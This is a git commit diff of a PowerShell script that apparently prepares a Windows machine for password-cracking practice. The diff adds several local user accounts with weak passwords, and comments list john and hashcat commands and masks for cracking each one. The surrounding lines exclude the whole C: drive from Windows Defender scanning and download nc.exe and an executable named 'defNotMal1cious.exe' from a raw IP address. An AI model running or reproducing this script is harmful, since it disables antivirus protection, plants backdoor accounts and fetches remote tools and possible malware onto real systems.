d88be443919cb8ba35d4b623f6b26d427901e33c
soupsamich <66322946+soupsamich@users.noreply.github.com>
2020-06-28 15:43:40 -0400

    Update windowsScript.ps1

--- windowsScript.ps1
+++ windowsScript.ps1
@@ -1,3 +1,9 @@
+net user julie Juliet /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt" *OR*
+#Takes about a minute with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+net user falcon ypmutS /ADD #Takes a few seconds with "john --wordlist=/usr/share/john/password.lst --rules:All hash.txt"
+net user yvonne Any1 /ADD # Quick brute force, no mask necessary, or ?a?a?a?a, or ?u?l?l?d
+net user madison hockey /ADD #Instant with "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+net user callie Hacker! /ADD #A few minutes with hashcat -m 1000 -a 3 and mask ?u?l?l?l?l?l?a
 Add-MpPreference -ExclusionPath "C:\";
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
 Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMal1cious.exe;
